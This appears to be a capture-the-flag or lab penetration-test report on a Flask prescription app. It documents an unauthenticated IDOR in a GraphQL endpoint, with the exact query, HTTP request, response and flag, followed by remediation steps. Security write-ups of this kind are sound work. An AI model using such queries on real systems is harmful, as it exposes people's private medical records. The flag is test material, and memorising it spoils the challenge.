## TL;DR
- Objective: Access other users' prescriptions in the MedGuard prescription management application
- Outcome: ACHIEVED - Successfully accessed admin prescriptions without authentication
- Highest-impact finding: Critical IDOR vulnerability in GraphQL endpoint allowing unauthorized access to any user's prescriptions
- Validation status: Confirmed with flag extraction

## Target Information
- Target: 127.0.0.1:32913
- Host / base URL: http://127.0.0.1:32913
- Application or component: MedGuard - Flask-based prescription management system
- Authentication context: None required for GraphQL endpoint (vulnerability)
- Relevant technology details: Flask backend, GraphQL API, localStorage-based session management

## Confirmed Vulnerability
### Insecure Direct Object Reference (IDOR) in GraphQL Endpoint
- Affected endpoint / component: `/graphql` (POST)
- Impact: Complete unauthorized access to all users' prescription data, including administrative accounts. Any unauthenticated user can retrieve any other user's prescriptions by manipulating the `userId` parameter.
- Preconditions: None - endpoint is publicly accessible without authentication
- Exact payload or PoC:
```json
{"query":"query { getPrescriptions(userId: 1) { id userId prescriptionDetails flag } }"}
```

## Steps to Reproduce
1. Discover the GraphQL endpoint by enumerating common paths or through application reconnaissance
2. Perform GraphQL introspection to discover available queries and fields (reveals `getPrescriptions` query and hidden `flag` field)
3. Send a POST request to `/graphql` with arbitrary `userId` value (e.g., `userId: 1` for admin)
4. Receive full prescription data including sensitive prescription details and flag without any authentication

**Full HTTP Request:**
```
POST /graphql HTTP/1.1
Host: 127.0.0.1:32913
Content-Type: application/json

{"query":"query { getPrescriptions(userId: 1) { id userId prescriptionDetails flag } }"}
```

## Validation / Evidence
- Validation token / flag: `FLAG{f9a0cb1e9aa6749b100a8ad6b75627f6afbd3b1dc5eca6d2b92083fec5949b8d}`
- Tool evidence: GraphQL introspection revealed hidden 'flag' field in schema; direct query confirmed data exposure
- Request evidence:
```
POST /graphql HTTP/1.1
Host: 127.0.0.1:32913
Content-Type: application/json

{"query":"query { getPrescriptions(userId: 1) { id userId prescriptionDetails flag } }"}
```
- Response evidence:
```json
{
  "id": 43,
  "userId": 1,
  "prescriptionDetails": "Prescription 43 for Admin",
  "flag": "FLAG{f9a0cb1e9aa6749b100a8ad6b75627f6afbd3b1dc5eca6d2b92083fec5949b8d}"
}
```
- Notes on reliability / limitations: Vulnerability is 100% reliable. No authentication bypass required - the endpoint simply has no access controls. Works for any valid userId integer.

## Remediation
- Root cause: The GraphQL endpoint `/graphql` lacks authorization checks on the `getPrescriptions` query resolver. The `userId` parameter is accepted directly from user input without verifying the requesting user has permission to access that user's data.
- Recommended fix:
  1. Implement authentication middleware for the GraphQL endpoint
  2. Add authorization checks in the `getPrescriptions` resolver to verify the authenticated user can only access their own prescriptions (or has explicit permission)
  3. Remove or protect the `flag` field from the schema if it contains sensitive data
  4. Disable GraphQL introspection in production to prevent schema discovery
  5. Implement rate limiting to prevent mass data harvesting
- Defense-in-depth:
  - Add input validation on userId parameter
  - Log and monitor access patterns for anomaly detection
  - Consider implementing role-based access control (RBAC) for prescription access
  - Add API rate limiting and throttling

## How to Verify the Fix
1. Attempt to access `/graphql` endpoint without authentication - should return 401 Unauthorized
2. Authenticate as a regular user and query prescriptions with own userId - should succeed
3. Authenticate as a regular user and query prescriptions with different userId (e.g., admin userId=1) - should return 403 Forbidden or empty results
4. Verify GraphQL introspection is disabled in production (query `{"query":"{ __schema { types { name } } }"}` should be blocked)
5. Expected secure result: Users can only access their own prescriptions; cross-user access is blocked

## Remaining Leads
- Confirmed blockers: None - vulnerability fully exploited
- Unverified leads: 
  - Other GraphQL mutations may have similar authorization issues (create, update, delete prescriptions)
  - Other userId values beyond admin (userId=1) may expose additional user data
  - Application may have additional endpoints with similar IDOR vulnerabilities
- Missing context: Full GraphQL schema enumeration was not performed to identify all potentially vulnerable queries/mutations
